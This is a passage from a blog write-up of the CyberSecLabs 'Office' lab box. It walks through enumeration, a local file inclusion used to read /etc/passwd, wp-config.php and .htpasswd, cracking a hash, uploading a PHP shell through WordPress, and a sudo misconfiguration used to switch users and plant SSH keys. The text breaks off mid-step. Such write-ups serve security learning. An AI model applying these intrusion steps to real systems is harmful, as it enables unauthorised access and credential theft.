<!DOCTYPE html>
<html lang="en">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="nair0lf32 ">
<meta name="description" content="Quick note: I have been way too generous in this writeup but hey&amp;hellip;it&amp;rsquo;s on me! I gave so many credentials (but no flags) making it easier than it should be. But it&amp;rsquo;s okay. If you really wanna learn you will learn. Now let&amp;rsquo;s get started
Enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 e2:3f:6c:4e:6d:8b:dc:59:b7:cb:66:64:27:f9:22:86 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC&#43;gFggQqxPisakN8dYc6fbiOED&#43;I&#43;HD7Le9lgYUcrpjdKozChagwV9s3ZKTGkgmkOpMVz9Ifhv3LnoXcNACuKDWU7d6HCX0Ab&#43;cJMwGX/D68AZBNlaFNyrJgUg52omwRs0aktor1TSxkjugyTaXY5LG1fl9/ZNm7OJaX3T8CCADnqDtsKAXPOEku90jUcnf1fkTr/rW2gkQbmfh/QwRO2jPHDtfdnObmwCslGdWDi1pg8IcMsw86enF5sZOjzAqJADbmY9H7gg77nPZCH9GMh5wv4Cb/y/c3o923EJ4h1MimpGj60aa2S1UKmjKs/e7pzoHGZYbadapvwne/94S2Xl| 256 ee:be:37:f3:75:4e:38:2a:a9:99:e0:18:1a:b8:d1:41 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPmYME2CvT8Wufq97CVcM38cok&#43;baDhxKCQ7dkt2/5uvS/ILT&#43;&#43;6C/0CFsmj1/oZv9JWBDu4uVnnaxLdn1o7mKY=| 256 7f:72:a7:29:be:30:9e:5e:aa:b9:fc:be:09:d2:8b:3a (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPlt&#43;7kyv4MWbk8UhliuRGa5/T&#43;3QiGgzj9XgWcHb&#43;AQ80/tcp open http syn-ack Apache httpd 2." />
<meta name="keywords" content="hacking, cybersecurity, ctf, nair0lf32, zerone, zer0ne" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="http://localhost:1313/writeups/cyberseclabs/office/office/" />


    <title>
        
            Office :: Zer0ne blog 
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="http://localhost:1313/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">



    <link rel="apple-touch-icon" sizes="180x180" href="http://localhost:1313/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
    <link rel="manifest" href="http://localhost:1313/site.webmanifest">
    <link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="http://localhost:1313/favicon.ico">
    <meta name="msapplication-TileColor" content="">


<meta itemprop="name" content="Office">
<meta itemprop="description" content="Quick note: I have been way too generous in this writeup but hey&hellip;it&rsquo;s on me! I gave so many credentials (but no flags) making it easier than it should be. But it&rsquo;s okay. If you really wanna learn you will learn. Now let&rsquo;s get started
Enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 e2:3f:6c:4e:6d:8b:dc:59:b7:cb:66:64:27:f9:22:86 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC&#43;gFggQqxPisakN8dYc6fbiOED&#43;I&#43;HD7Le9lgYUcrpjdKozChagwV9s3ZKTGkgmkOpMVz9Ifhv3LnoXcNACuKDWU7d6HCX0Ab&#43;cJMwGX/D68AZBNlaFNyrJgUg52omwRs0aktor1TSxkjugyTaXY5LG1fl9/ZNm7OJaX3T8CCADnqDtsKAXPOEku90jUcnf1fkTr/rW2gkQbmfh/QwRO2jPHDtfdnObmwCslGdWDi1pg8IcMsw86enF5sZOjzAqJADbmY9H7gg77nPZCH9GMh5wv4Cb/y/c3o923EJ4h1MimpGj60aa2S1UKmjKs/e7pzoHGZYbadapvwne/94S2Xl| 256 ee:be:37:f3:75:4e:38:2a:a9:99:e0:18:1a:b8:d1:41 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPmYME2CvT8Wufq97CVcM38cok&#43;baDhxKCQ7dkt2/5uvS/ILT&#43;&#43;6C/0CFsmj1/oZv9JWBDu4uVnnaxLdn1o7mKY=| 256 7f:72:a7:29:be:30:9e:5e:aa:b9:fc:be:09:d2:8b:3a (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPlt&#43;7kyv4MWbk8UhliuRGa5/T&#43;3QiGgzj9XgWcHb&#43;AQ80/tcp open http syn-ack Apache httpd 2."><meta itemprop="datePublished" content="2022-09-16T18:33:31+01:00" />
<meta itemprop="dateModified" content="2024-01-31T11:24:29+01:00" />
<meta itemprop="wordCount" content="2038"><meta itemprop="image" content="http://localhost:1313/" />
<meta itemprop="keywords" content="" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="http://localhost:1313/" /><meta name="twitter:title" content="Office"/>
<meta name="twitter:description" content="Quick note: I have been way too generous in this writeup but hey&hellip;it&rsquo;s on me! I gave so many credentials (but no flags) making it easier than it should be. But it&rsquo;s okay. If you really wanna learn you will learn. Now let&rsquo;s get started
Enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 e2:3f:6c:4e:6d:8b:dc:59:b7:cb:66:64:27:f9:22:86 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC&#43;gFggQqxPisakN8dYc6fbiOED&#43;I&#43;HD7Le9lgYUcrpjdKozChagwV9s3ZKTGkgmkOpMVz9Ifhv3LnoXcNACuKDWU7d6HCX0Ab&#43;cJMwGX/D68AZBNlaFNyrJgUg52omwRs0aktor1TSxkjugyTaXY5LG1fl9/ZNm7OJaX3T8CCADnqDtsKAXPOEku90jUcnf1fkTr/rW2gkQbmfh/QwRO2jPHDtfdnObmwCslGdWDi1pg8IcMsw86enF5sZOjzAqJADbmY9H7gg77nPZCH9GMh5wv4Cb/y/c3o923EJ4h1MimpGj60aa2S1UKmjKs/e7pzoHGZYbadapvwne/94S2Xl| 256 ee:be:37:f3:75:4e:38:2a:a9:99:e0:18:1a:b8:d1:41 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPmYME2CvT8Wufq97CVcM38cok&#43;baDhxKCQ7dkt2/5uvS/ILT&#43;&#43;6C/0CFsmj1/oZv9JWBDu4uVnnaxLdn1o7mKY=| 256 7f:72:a7:29:be:30:9e:5e:aa:b9:fc:be:09:d2:8b:3a (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPlt&#43;7kyv4MWbk8UhliuRGa5/T&#43;3QiGgzj9XgWcHb&#43;AQ80/tcp open http syn-ack Apache httpd 2."/>



    <meta property="og:title" content="Office" />
<meta property="og:description" content="Quick note: I have been way too generous in this writeup but hey&hellip;it&rsquo;s on me! I gave so many credentials (but no flags) making it easier than it should be. But it&rsquo;s okay. If you really wanna learn you will learn. Now let&rsquo;s get started
Enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 e2:3f:6c:4e:6d:8b:dc:59:b7:cb:66:64:27:f9:22:86 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC&#43;gFggQqxPisakN8dYc6fbiOED&#43;I&#43;HD7Le9lgYUcrpjdKozChagwV9s3ZKTGkgmkOpMVz9Ifhv3LnoXcNACuKDWU7d6HCX0Ab&#43;cJMwGX/D68AZBNlaFNyrJgUg52omwRs0aktor1TSxkjugyTaXY5LG1fl9/ZNm7OJaX3T8CCADnqDtsKAXPOEku90jUcnf1fkTr/rW2gkQbmfh/QwRO2jPHDtfdnObmwCslGdWDi1pg8IcMsw86enF5sZOjzAqJADbmY9H7gg77nPZCH9GMh5wv4Cb/y/c3o923EJ4h1MimpGj60aa2S1UKmjKs/e7pzoHGZYbadapvwne/94S2Xl| 256 ee:be:37:f3:75:4e:38:2a:a9:99:e0:18:1a:b8:d1:41 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPmYME2CvT8Wufq97CVcM38cok&#43;baDhxKCQ7dkt2/5uvS/ILT&#43;&#43;6C/0CFsmj1/oZv9JWBDu4uVnnaxLdn1o7mKY=| 256 7f:72:a7:29:be:30:9e:5e:aa:b9:fc:be:09:d2:8b:3a (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPlt&#43;7kyv4MWbk8UhliuRGa5/T&#43;3QiGgzj9XgWcHb&#43;AQ80/tcp open http syn-ack Apache httpd 2." />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://localhost:1313/writeups/cyberseclabs/office/office/" /><meta property="og:image" content="http://localhost:1313/" /><meta property="article:section" content="writeups" />
<meta property="article:published_time" content="2022-09-16T18:33:31+01:00" />
<meta property="article:modified_time" content="2024-01-31T11:24:29+01:00" />





    <meta property="article:section" content="Cyberseclabs" />



    <meta property="article:published_time" content="2022-09-16 18:33:31 &#43;0100 WAT" />










    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="http://localhost:1313/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">#&gt;</span>
            <span class="logo__text">0/1</span>
            <span class="logo__cursor" style=
                  "
                   background-color:#0FF00D;
                   animation-duration:2s;">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="http://localhost:1313/about">About</a></li><li><a href="http://localhost:1313/posts">Blog</a></li><li><a href="http://localhost:1313/writeups">Writeups</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
 </svg></span>
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="http://localhost:1313/writeups/cyberseclabs/office/office/">Office</a></h2>

            
            
            

            <div class="post-content">
                <p>Quick note: I have been way too generous in this writeup but hey&hellip;it&rsquo;s on me! I gave so many credentials (but no flags) making it easier than it should be. But it&rsquo;s okay. If you really wanna learn you will learn. Now let&rsquo;s get started</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="nmap">nmap</h3>
<pre tabindex="0"><code>PORT      STATE    SERVICE          REASON      VERSION
22/tcp    open     ssh              syn-ack     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:3f:6c:4e:6d:8b:dc:59:b7:cb:66:64:27:f9:22:86 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+gFggQqxPisakN8dYc6fbiOED+I+HD7Le9lgYUcrpjdKozChagwV9s3ZKTGkgmkOpMVz9Ifhv3LnoXcNACuKDWU7d6HCX0Ab+cJMwGX/D68AZBNlaFNyrJgUg52omwRs0aktor1TSxkjugyTaXY5LG1fl9/ZNm7OJaX3T8CCADnqDtsKAXPOEku90jUcnf1fkTr/rW2gkQbmfh/QwRO2jPHDtfdnObmwCslGdWDi1pg8IcMsw86enF5sZOjzAqJADbmY9H7gg77nPZCH9GMh5wv4Cb/y/c3o923EJ4h1MimpGj60aa2S1UKmjKs/e7pzoHGZYbadapvwne/94S2Xl
|   256 ee:be:37:f3:75:4e:38:2a:a9:99:e0:18:1a:b8:d1:41 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPmYME2CvT8Wufq97CVcM38cok+baDhxKCQ7dkt2/5uvS/ILT++6C/0CFsmj1/oZv9JWBDu4uVnnaxLdn1o7mKY=
|   256 7f:72:a7:29:be:30:9e:5e:aa:b9:fc:be:09:d2:8b:3a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPlt+7kyv4MWbk8UhliuRGa5/T+3QiGgzj9XgWcHb+AQ

80/tcp    open     http             syn-ack     Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-generator: WordPress 5.4.1
|_http-title: Dunder Mifflin &amp;#8211; Just another WordPress site

443/tcp   open     ssl/http         syn-ack     Apache httpd 2.4.29 ((Ubuntu))
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.29 (Ubuntu)
| ssl-cert: Subject: commonName=office.csl/organizationName=Dunder Mifflin/stateOrProvinceName=PA/countryName=US/localityName=Scranton/emailAddress=dwight@office.csl
| Issuer: commonName=office.csl/organizationName=Dunder Mifflin/stateOrProvinceName=PA/countryName=US/localityName=Scranton/emailAddress=dwight@office.csl
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-08T20:01:51
| Not valid after:  2021-05-08T20:01:51
| MD5:   e159 faf3 e637 25ad 7d95 3210 9a69 bce6
| SHA-1: adee e6e5 1566 a86f c8d9 6d7e 1fc0 2239 e21e 92ef
| -----BEGIN CERTIFICATE-----
| MIIF2zCCA8OgAwIBAgIUclv5tp1a/+9jd8c5WFlk2dNYSzwwDQYJKoZIhvcNAQEL
| BQAwfTELMAkGA1UEBhMCVVMxCzAJBgNVBAgMAlBBMREwDwYDVQQHDAhTY3JhbnRv
| bjEXMBUGA1UECgwORHVuZGVyIE1pZmZsaW4xEzARBgNVBAMMCm9mZmljZS5jc2wx
| IDAeBgkqhkiG9w0BCQEWEWR3aWdodEBvZmZpY2UuY3NsMB4XDTIwMDUwODIwMDE1
| MVoXDTIxMDUwODIwMDE1MVowfTELMAkGA1UEBhMCVVMxCzAJBgNVBAgMAlBBMREw
| DwYDVQQHDAhTY3JhbnRvbjEXMBUGA1UECgwORHVuZGVyIE1pZmZsaW4xEzARBgNV
| BAMMCm9mZmljZS5jc2wxIDAeBgkqhkiG9w0BCQEWEWR3aWdodEBvZmZpY2UuY3Ns
| MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAyzFMJrdDgahPUQwFRU5i
| /m0PcvBBIY2BvfxBrb6aQ8WHpj5rcKBFZbBuLK5sPWazz+Tc4jhjqOQ14/x9NTZx
| L0/1Oyq57psmoVbMKEtFOUC5uBv0Akp6fOZEDf4IZ5CpyO04OAVKqts4T/0Rxjem
| dwcuLtP4W95Q8Qt0SJn4ITlb8a3ehBhON5BvTBEL048mAzY0ZTFtNa3cCVJyGQZT
| uXI/qqwhrUKDD8Z5VdHrNBjawF+2e5KB+fPoaz7+KlgBMLdMhB6tDM/Ge4FP4XcH
| vshqy6PUW2cEIlKp0Rexy45VL6mNM3bdpHU/mEjA4G0Km88uw0Ckzi46X3+3gWl2
| j3347PbXBwos/AFR848o5o+w6MZk7GW3nSFZCN714PTdyxVebJhdORG952Npe5x1
| FGuIoTu5w+dW2GOo4/puU6eDfomq94/cF/AYXXvRJlFAJDgTMDWqIaazQ1sEbc/s
| X+rSeHON0Q9eiq8DJPi7Vb+5K59QW2Ivyo+GiRqbL7T3zIqLgfwU1w3g6V/yEoJW
| N1LBCW4vktelDmujHNQpeqVbgIkxi6hrEBy+uSlc/ItJOZ80SX26Gb1k1yDAs2up
| yCNbrb0/wOgOooIU+t7SL5gEBscfuhY6apb+KffL8+pfj+MnRARRS+o8AHR6CSkL
| 7MjkR4E8pk09AszIFsbqUacCAwEAAaNTMFEwHQYDVR0OBBYEFP4XwrmZnpFSInDH
| /riI853iqOMFMB8GA1UdIwQYMBaAFP4XwrmZnpFSInDH/riI853iqOMFMA8GA1Ud
| EwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggIBAD8fOtMsIsVtzesL0lMH8aQu
| innrVX4PG4biu3yH1JmwRpJ8wWLycrxh/rWQQJhKLGYyFQOzBcEw39ptSdQrmyVB
| harz7BqJ1VY1sDmLUg76bsCeTjmiaP7lw1UvMWgTBVpMyLMFEtuEAfbKZFsJzCiD
| i38EX9sTkjqn3ZcEpfKK4xitlPLxNrL1pshJhg4mBhbiKzzCsSEb1uvjefEm6PAe
| OewZ5jORiQLW2dUirCYxxYOjISVB38qXsgprrjhzvE2F4qLKQzt45eN9IoyI+8+l
| Ta6pdXYczkRvy4UlwZeVWopTEwpoRGwNIPAU/cFPEqs7zRBCZAGW12TWQkQ8MC75
| J5FlSR4lv40EmuqGEalcDXnGdJXxLtDcauTygMnLCrp5wWfHGakkRIHJDUiLw2VO
| VJYxayTxp0r3Rk/2M6kHf12frhkzqv24eP/moLj73yBqJOanp2akQhRUe40ockMl
| HWzY5Y2ujilPHJn4ndPYgFwGhZIdgBOJ0mQlNLGSuZwL2sXo9CdQcJFvEz/C3Y5X
| +fNjCb9ZFQXl0Ybmi8zlM1wF0oncc3AcodPTi3VTbfvwvbQ+Wav6Lah4v1fyCdvl
| 9zAEyYXMnQdNuVVEB+BKVxgVRr/bplf2H1cquvgxUY+LstNh8rKbBn4guWp5yJ7m
| ClSGew5a8zXLdnOZ6F5z
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
10000/tcp filtered snet-sensor-mgmt no-response
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
</code></pre><h3 id="ffuf">ffuf</h3>
<pre tabindex="0"><code>                        [Status: 200, Size: 32243, Words: 1617, Lines: 441]
.hta                    [Status: 403, Size: 275, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 275, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 275, Words: 20, Lines: 10]
index.php               [Status: 301, Size: 0, Words: 1, Lines: 1]
server-status           [Status: 403, Size: 275, Words: 20, Lines: 10]
wp-admin                [Status: 301, Size: 311, Words: 20, Lines: 10]
wp-content              [Status: 301, Size: 313, Words: 20, Lines: 10]
wp-includes             [Status: 301, Size: 314, Words: 20, Lines: 10]
xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1]
</code></pre><p>On the website</p>
<pre tabindex="0"><code>Hey guys, it’s your future manager, Dwight.

Yes, you heard that right! I made an accountability booster to set off once you guys make 5 mistakes in a single day, which I bet will happen!

I started a forum page on a subdomain, y’all can vent there before I send out an email to corporate.

PS: Can’t wait to fire you Jim! 😉
</code></pre><p>LMAO! ok now I get the theme&hellip;its the <code>office</code></p>
<p>It have to be funny</p>
<p>ok we need to fuzz for <code>subdomains</code></p>
<p>when we click on login or visit <code>wp-admin</code> we are redirected to <code>office.csl</code></p>
<p>we need to add it to our <code>/etc/hosts</code> with current ip.address</p>
<pre tabindex="0"><code>└──╼ $ffuf -c -w /usr/share/wordlists/dirb/common.txt -u http://office.csl -H &#34;HOST: FUZZ.office.csl&#34; -fs 32243,0

        /&#39;___\  /&#39;___\           /&#39;___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://office.csl
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Header           : Host: FUZZ.office.csl
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 32243,0
________________________________________________

forum                   [Status: 200, Size: 8773, Words: 1999, Lines: 298]
:: Progress: [4614/4614] :: Job [1/1] :: 11 req/sec :: Duration: [0:14:09] :: Errors: 32 ::
</code></pre><p>we add the subdomain <code>forum</code> too</p>
<p>We access the forum&hellip;it&rsquo;s Hilarious!</p>
<p>the chatlog page url looks like this</p>
<p><code>http://forum.office.csl/chatlogs/chatlogs.php?file=chatlog.txt</code></p>
<p>Found it yet? yes LFI it is!!</p>
<p>reading <code>/etc/passwd</code> we get 2 users (except root of course)</p>
<pre tabindex="0"><code>ryan:x:1000:1000:ryan:/home/ryan:/bin/bash
dwight:x:1001:1001:Dwight Schrute,,,:/home/dwight:/bin/bash
</code></pre><p>As it is a wordpress installation maybe we can read <code>wp-config.php</code></p>
<p>Or we can use <code>wpscan</code> to enumerate it faster</p>
<p>the ssl certificate in nmap got <code>dwight email</code> as <code>dwight@office.csl</code> it may be valid for wordpress&hellip;now we need his password</p>
<p>Anyway we try to read <code>/var/www/html/wordpress/wp-config.php</code> bypassing the <code>php filter</code> by base64-encoding the result</p>
<pre tabindex="0"><code>Then we decode it

&lt;?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don&#39;t have to use the web site, you can
 * copy this file to &#34;wp-config.php&#34; and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( &#39;DB_NAME&#39;, &#39;wordpress_db&#39; );

/** MySQL database username */
define( &#39;DB_USER&#39;, &#39;wp_user&#39; );

/** MySQL database password */
define( &#39;DB_PASSWORD&#39;, &#39;password&#39; );

/** MySQL hostname */
define( &#39;DB_HOST&#39;, &#39;localhost&#39; );

/** Database Charset to use in creating database tables. */
define( &#39;DB_CHARSET&#39;, &#39;utf8mb4&#39; );

/** The Database Collate type. Don&#39;t change this if in doubt. */
define( &#39;DB_COLLATE&#39;, &#39;&#39; );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( &#39;AUTH_KEY&#39;,         &#39;K?*8s`Xfnkt9?74&gt;//s#el MgR,W)SU=GI{T1Lgk2|LvxpwCNB)xh[ Y2R}DKex*&#39; );
define( &#39;SECURE_AUTH_KEY&#39;,  &#39;qZEh{g*6 wQ=pPyrviUBo,jolsX }CS=}Al6aZ!)jNUrrtS`Pu,GWVmN1B/T81k)&#39; );
define( &#39;LOGGED_IN_KEY&#39;,    &#39;ycKjK|*?NmdO&gt;-=i=f[|)3{%`NbgJ0mPg,$}AN&lt;20c`w/uN9 Cl%x~-t7%79A}|R&#39; );
define( &#39;NONCE_KEY&#39;,        &#39;s,S|QP}:kVxnCojN2/$t&gt;+yIZg@h-*.)P)%&gt;Z!4V|gw|^]cGb[c9P1)CtZlda4/$&#39; );
define( &#39;AUTH_SALT&#39;,        &#39;N3XWgQ0nVzDJIYGF8aMAQC|-_/tyVnbu)&lt;Vg|zp?`:E`&amp;H|;,BD*=(,rwACgLQto&#39; );
define( &#39;SECURE_AUTH_SALT&#39;, &#39;{`p%d_ml^Z.qz=I{ R&amp;h7emWoB&lt;CB:Vu3Y&amp;XZ:cD@j[y&amp;A(dK`;j)QoR4Lr_w&amp;`?&#39; );
define( &#39;LOGGED_IN_SALT&#39;,   &#39;F uf_8rV&amp;iJ+K24pxZ_c7_&lt;olfPj+k1E%Sp?Og!iBtUeMef^z9.=@Bfdj@(%|;20&#39; );
define( &#39;NONCE_SALT&#39;,       &#39; v&lt;tz;lAI5B4Mbv{|N]soUcC;tGCCz^rxGb-{*l,W55Zl&amp;&amp;XOPTg&lt;-RRWR{)u}I;&#39; );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = &#39;wp_&#39;;

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( &#39;WP_DEBUG&#39;, false );

/* That&#39;s all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( &#39;ABSPATH&#39; ) ) {
        define( &#39;ABSPATH&#39;, __DIR__ . &#39;/&#39; );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . &#39;wp-settings.php&#39;;
</code></pre><p>Ok now we got <code>wp_user : password</code> but that is not very useful yet</p>
<p>we look for other files&hellip;</p>
<p>Lol <code>.htpasswd</code> got dwight creds&hellip;but hashed</p>
<pre tabindex="0"><code>dwight:$apr1$7FARE4DE$lKgF/R9rSUEY6s.L79/dM/ 
</code></pre><p>its md5 APR (hashcat mode 1600)</p>
<p>and we get <code>dwight : cowboys1</code></p>
<p>we use <code>dwight@office.csl</code> with that password to get to the wordpress dashboard</p>
<h2 id="exploitation">Exploitation</h2>
<p>Upload a <a href="http://localhost:1313/csl/office/shell.php">PHP shell</a> in the WP file manager and get access on a netcat listenner</p>
<p>(maybe we could use the plugins too but we would have to format our php file as a wp plugin and zip it&hellip;tedious)</p>
<p>Visit <code>http://office.csl/shell.php</code> to get inside&hellip;&ldquo;the office&rdquo;</p>
<pre tabindex="0"><code>$ cd /home/dwight
$ ls
access.txt
$ cat access.txt
access_flag_here
</code></pre><h2 id="privilege-escalation">privilege escalation</h2>
<p>we have write permissions to his <code>.ssh</code> folder</p>
<pre tabindex="0"><code>$ sudo -l
Matching Defaults entries for www-data on office:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on office:
    (dwight) NOPASSWD: /bin/bash
</code></pre><p>and we can switch to dwight lol</p>
<pre tabindex="0"><code>$ sudo -u dwight /bin/bash
whoami
dwight
python3 -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
dwight@office:~/.ssh$
</code></pre><p>Generate new <code>ssh keys</code> for dwight</p>
<pre tabindex="0"><code>dwight@office:~/.ssh$ ssh-keygen
ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/dwight/.ssh/id_rsa): 

Enter passphrase (empty for no passphrase): 

Enter same passphrase again: 

Your identification has been saved in /home/dwight/.ssh/id_rsa.
Your public key has been saved in /home/dwight/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:idjQRF1GQum8RxJ5md/0V8XxjbkP3RMJgHb0Dvg6Fo8 dwight@office
The key&#39;s randomart image is:
+---[RSA 2048]----+
|     .ooo=*=.. o+|
|     o  ===.. oo*|
|    . .o.+.o +o++|
|     + .+.o + .o=|
|    . o S= . .o.+|
|        . *    o.|
|         E .    .|
|        . .      |
|                 |
+----[SHA256]-----+
</code></pre><p>Add <code>public key</code> to <code>authorizzed_keys</code></p>
<pre tabindex="0"><code>dwight@office:~/.ssh$ ls -al
ls -al
total 16
drwxrwxr-x 2 dwight dwight 4096 Nov 30 22:33 .
drwxr-xr-x 4 dwight dwight 4096 May  8  2020 ..
-rw------- 1 dwight dwight 1679 Nov 30 22:33 id_rsa
-rw-r--r-- 1 dwight dwight  395 Nov 30 22:33 id_rsa.pub
dwight@office:~/.ssh$ cat id_rsa.pub
cat id_rsa.pub
